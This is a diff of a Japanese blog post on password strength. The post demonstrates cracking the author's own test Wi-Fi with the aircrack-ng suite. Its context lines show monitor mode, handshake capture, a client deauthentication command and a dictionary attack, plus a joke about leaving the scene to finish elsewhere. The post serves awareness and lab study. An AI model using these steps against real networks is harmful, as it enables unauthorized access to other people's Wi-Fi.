@@ -8,9 +8,9 @@ tags: ["Aircracking-ng", "Parrot Security OS"]
 draft: false
 ---
 
-# Password の重要性を再考。
+## Password の重要性を再考
 
-## 大文字、小文字、数字、記号、何かと面倒なパスワード
+### 大文字、小文字、数字、記号、何かと面倒なパスワード
 
 最近パスワードを設定しようとすると   \
 **"8 文字以上、大文字、小文字、数字、記号"** を混ぜてください。\
@@ -31,7 +31,7 @@ Google などは一度登録したパスワードは再生成できない。こ�
 
 という当たり前の言葉だけでなくそんなパスワードの重要性を "Wi-Fi" を題材に考え直してみます。
 
-**検証環境**
+***検証環境***
 
 - MAC
 - VMware Fusion(MAC)上の "Parrot Security OS "
@@ -57,20 +57,20 @@ WEP 使ってる方は今すぐ Wi-Fi ルーターを買い換えましょう。
 - SSID : wifi-test
 - Password : yakiniku
 
-![](images/Screen-Shot-2019-09-16-at-21.07.44.png)
+![image](images/Screen-Shot-2019-09-16-at-21.07.44.png)
 
 MAC でみると
 
-![](images/Screen-Shot-2019-09-16-at-21.08.34.png)
+![image](images/Screen-Shot-2019-09-16-at-21.08.34.png)
 
 "Parrot Security OS"に Wi-Fi 子機を接続\
 Amazon でポチったやつ （動作はするが熱くなる)
 
-![](images/wifi-usb.jpg)
+![image](images/wifi-usb.jpg)
 
 "Parrot Security OS"から Wi-Fi 一覧をみてみる
 
-![](images/Screen-Shot-2019-09-16-at-21.23.42.png)
+![image](images/Screen-Shot-2019-09-16-at-21.23.42.png)
 
 電波をキャッチできてる模様
 
@@ -84,7 +84,7 @@ Amazon でポチったやつ （動作はするが熱くなる)
 iwconfig
 ```
 
-![](images/Screen-Shot-2019-09-16-at-21.27.22.png)
+![image](images/Screen-Shot-2019-09-16-at-21.27.22.png)
 
 モニターモードへ変更
 
@@ -98,7 +98,7 @@ airmon-ng start wlan0
 iwconfig
 ```
 
-![](images/Screen-Shot-2019-09-16-at-21.28.22.png)
+![image](images/Screen-Shot-2019-09-16-at-21.28.22.png)
 
 wlan0mon を確認
 
@@ -108,7 +108,7 @@ wlan0mon を確認
 airodump-ng wlan0mon
 ```
 
-![](images/airodump-1.jpg)
+![image](images/airodump-1.jpg)
 
 wifi-test で通信が行われているのを確認 (YouTube を再生してるため)
 
@@ -120,7 +120,7 @@ airodump-ng -c 1 --bssid xx:xx:xx:xx:xx:xx -w wifi-test wlan0mon
 
 - xx:xx:xx:xx:xx:xx は WiFi ルーターの MAC アドレス
 
-![](images/Screen-Shot-2019-09-17-at-0.38.20.png)
+![image](images/Screen-Shot-2019-09-17-at-0.38.20.png)
 
 ただただ・・・待つ・・・
 
@@ -133,7 +133,7 @@ aireplay-ng -0 1 -a xx:xx:xx:xx:xx:xx-c yy:yy:yy:yy:yy:yy wlan0mon
 
 - yy:yy:yy:yy:yy:yy は接続している機器のの MAC アドレス
 
-![](images/handshake.jpg)
+![image](images/handshake.jpg)
 
 接続情報をキャプチャーできたようです。 ここまでくればあとはパスワードを解析するだけです。 キャプチャーをやめ WiFi モニタリングもやめ、とっととその場を離れ近所のコーヒーショップで続きをやるのもいいでしょう。
 
@@ -164,7 +164,7 @@ yakiniku
 aircrack-ng wifi-test-xxx.cap -w japanes_pass.txt -b xx:xx:xx:xx:xx:xx
 ```
 
-![](images/Screen-Shot-2019-09-17-at-0.51.28.png)
+![image](images/Screen-Shot-2019-09-17-at-0.51.28.png)
 
 正しく解析できました。
 
